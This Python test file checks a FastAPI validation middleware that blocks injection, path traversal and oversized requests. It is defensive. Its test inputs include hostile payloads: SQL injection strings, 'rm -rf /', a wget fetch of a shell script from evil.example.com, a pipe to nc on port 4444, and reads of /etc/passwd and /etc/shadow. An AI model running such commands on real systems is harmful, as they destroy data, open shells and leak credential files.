# Copyright 2025-2026 mrveiss
# SPDX-License-Identifier: Apache-2.0
# AutoBot - AI-Powered Automation Platform
# Copyright (c) 2025 mrveiss
# Author: mrveiss
"""
Unit tests for ValidationMiddleware (Issue #3274).

Covers:
- Clean requests pass through unchanged
- SQL injection in query params → 400
- SQL injection in JSON body → 400
- Command injection in JSON body → 400
- Path traversal in query params → 400
- Path traversal in JSON body → 400
- Oversized body → 413
- Exempt paths bypass all checks
- Non-JSON body methods (GET) are not body-scanned
- Nested injection in body dict → 400
"""

from __future__ import annotations

import pytest
from fastapi import FastAPI
from fastapi.testclient import TestClient

from middleware.validation_middleware import ValidationMiddleware

# ---------------------------------------------------------------------------
# Test app fixture
# ---------------------------------------------------------------------------


def _make_app(max_body_bytes: int = 1024 * 1024) -> FastAPI:
    """Return a minimal FastAPI app with ValidationMiddleware mounted."""
    app = FastAPI()
    app.add_middleware(ValidationMiddleware, max_body_bytes=max_body_bytes)

    @app.get("/api/test")
    async def get_endpoint():
        return {"ok": True}

    @app.post("/api/test")
    async def post_endpoint(payload: dict = None):
        return {"ok": True}

    @app.get("/health")
    async def health():
        return {"status": "ok"}

    return app


@pytest.fixture()
def client() -> TestClient:
    return TestClient(_make_app(), raise_server_exceptions=False)


@pytest.fixture()
def small_client() -> TestClient:
    """Client with a 10-byte body limit for size-guard tests."""
    return TestClient(_make_app(max_body_bytes=10), raise_server_exceptions=False)


# ---------------------------------------------------------------------------
# Happy-path tests
# ---------------------------------------------------------------------------


def test_clean_get_passes(client: TestClient) -> None:
    resp = client.get("/api/test")
    assert resp.status_code == 200


def test_clean_post_passes(client: TestClient) -> None:
    resp = client.post(
        "/api/test",
        json={"message": "hello world", "user": "alice"},
    )
    assert resp.status_code == 200


def test_clean_query_param_passes(client: TestClient) -> None:
    resp = client.get("/api/test", params={"q": "open source software"})
    assert resp.status_code == 200


# ---------------------------------------------------------------------------
# SQL injection
# ---------------------------------------------------------------------------


def test_sql_injection_query_param_rejected(client: TestClient) -> None:
    resp = client.get("/api/test", params={"q": "' OR 1=1 --"})
    assert resp.status_code == 400
    body = resp.json()
    assert body["error"] == "VALIDATION_ERROR"
    assert "sql_injection" in body["details"]


def test_sql_union_select_in_body_rejected(client: TestClient) -> None:
    resp = client.post(
        "/api/test",
        json={"query": "UNION SELECT * FROM users"},
    )
    assert resp.status_code == 400
    body = resp.json()
    assert "sql_injection" in body["details"]


def test_sql_drop_table_in_body_rejected(client: TestClient) -> None:
    resp = client.post(
        "/api/test",
        json={"cmd": "DROP TABLE sessions; --"},
    )
    assert resp.status_code == 400


def test_sql_injection_nested_dict_rejected(client: TestClient) -> None:
    resp = client.post(
        "/api/test",
        json={"outer": {"inner": "'; DROP TABLE users; --"}},
    )
    assert resp.status_code == 400


# ---------------------------------------------------------------------------
# Command injection
# ---------------------------------------------------------------------------


def test_command_injection_body_rejected(client: TestClient) -> None:
    resp = client.post(
        "/api/test",
        json={"input": "foo; rm -rf /"},
    )
    assert resp.status_code == 400
    body = resp.json()
    assert "command_injection" in body["details"]


def test_command_injection_backtick_rejected(client: TestClient) -> None:
    resp = client.post(
        "/api/test",
        json={"cmd": "`wget http://evil.example.com/shell.sh`"},
    )
    assert resp.status_code == 400


def test_command_injection_pipe_rejected(client: TestClient) -> None:
    resp = client.post(
        "/api/test",
        json={"data": "output | nc 1.2.3.4 4444"},
    )
    assert resp.status_code == 400


# ---------------------------------------------------------------------------
# Path traversal
# ---------------------------------------------------------------------------


def test_path_traversal_query_param_rejected(client: TestClient) -> None:
    resp = client.get("/api/test", params={"file": "../../etc/passwd"})
    assert resp.status_code == 400
    body = resp.json()
    assert "path_traversal" in body["details"]


def test_path_traversal_encoded_rejected(client: TestClient) -> None:
    resp = client.get("/api/test", params={"path": "%2e%2e%2fetc%2fpasswd"})
    assert resp.status_code == 400


def test_path_traversal_body_rejected(client: TestClient) -> None:
    resp = client.post(
        "/api/test",
        json={"filename": "../../../etc/shadow"},
    )
    assert resp.status_code == 400
    body = resp.json()
    assert "path_traversal" in body["details"]


# ---------------------------------------------------------------------------
# Body size guard
# ---------------------------------------------------------------------------


def test_oversized_body_rejected(small_client: TestClient) -> None:
    # 11 bytes > 10-byte limit
    resp = small_client.post(
        "/api/test",
        content=b"A" * 11,
        headers={"Content-Type": "application/json"},
    )
    assert resp.status_code == 413
    body = resp.json()
    assert body["error"] == "PAYLOAD_TOO_LARGE"


def test_body_at_limit_passes(small_client: TestClient) -> None:
    # Exactly 10 bytes — must not be rejected by size guard
    resp = small_client.post(
        "/api/test",
        content=b'{"x":"y"})',
        headers={"Content-Type": "application/json"},
    )
    assert resp.status_code in (200, 422)  # 422 = FastAPI schema error, not size error


# ---------------------------------------------------------------------------
# Exempt path bypass
# ---------------------------------------------------------------------------


def test_exempt_health_path_bypasses(client: TestClient) -> None:
    resp = client.get("/health")
    assert resp.status_code == 200


def test_exempt_path_with_injection_in_query_bypasses(client: TestClient) -> None:
    """Exempt paths must not be rejected even if the query looks malicious."""
    resp = client.get("/health", params={"q": "' OR 1=1--"})
    assert resp.status_code == 200


# ---------------------------------------------------------------------------
# GET does not body-scan
# ---------------------------------------------------------------------------


def test_get_with_no_body_scan(client: TestClient) -> None:
    """GET requests are never body-scanned; this should pass cleanly."""
    resp = client.get("/api/test")
    assert resp.status_code == 200


# ---------------------------------------------------------------------------
# Response format
# ---------------------------------------------------------------------------


def test_rejection_response_format(client: TestClient) -> None:
    resp = client.get("/api/test", params={"q": "UNION SELECT * FROM users"})
    assert resp.status_code == 400
    body = resp.json()
    assert "error" in body
    assert "details" in body
    assert isinstance(body["details"], str)


# ---------------------------------------------------------------------------
# /chats/{id}/save storage-path exemption
# ---------------------------------------------------------------------------


import uuid as _uuid


@pytest.fixture()
def save_client() -> TestClient:
    """Client with /api/chats/{chat_id}/save registered (storage endpoint)."""
    app = _make_app()

    @app.post("/api/chats/{chat_id}/save")
    async def save_endpoint(chat_id: str):
        return {"ok": True}

    return TestClient(app, raise_server_exceptions=False)


def test_save_path_allows_shell_command_content(save_client: TestClient) -> None:
    """Web search results and AI responses with shell patterns must not block saves."""
    chat_id = str(_uuid.uuid4())
    resp = save_client.post(
        f"/api/chats/{chat_id}/save",
        json={
            "messages": [
                {
                    "role": "assistant",
                    "content": (
                        "You can list files with `ls -la` or pipe output: "
                        "cat /etc/hosts | curl -s http://example.com"
                    ),
                }
            ]
        },
    )
    assert resp.status_code == 200


def test_non_save_path_still_blocks_injection(client: TestClient) -> None:
    """Injection on non-exempt paths must still be rejected."""
    resp = client.post(
        "/api/test",
        json={"content": "foo; rm -rf /"},
    )
    assert resp.status_code == 400


def test_save_path_oversized_body_rejected() -> None:
    """/save is scan-exempt but must still be rejected when the body exceeds the limit."""
    app = _make_app(max_body_bytes=10)

    @app.post("/api/chats/{chat_id}/save")
    async def save_endpoint(chat_id: str):
        return {"ok": True}

    tc = TestClient(app, raise_server_exceptions=False)
    chat_id = str(_uuid.uuid4())
    resp = tc.post(
        f"/api/chats/{chat_id}/save",
        content=b"A" * 11,
        headers={"Content-Type": "application/json"},
    )
    assert resp.status_code == 413
    assert resp.json()["error"] == "PAYLOAD_TOO_LARGE"
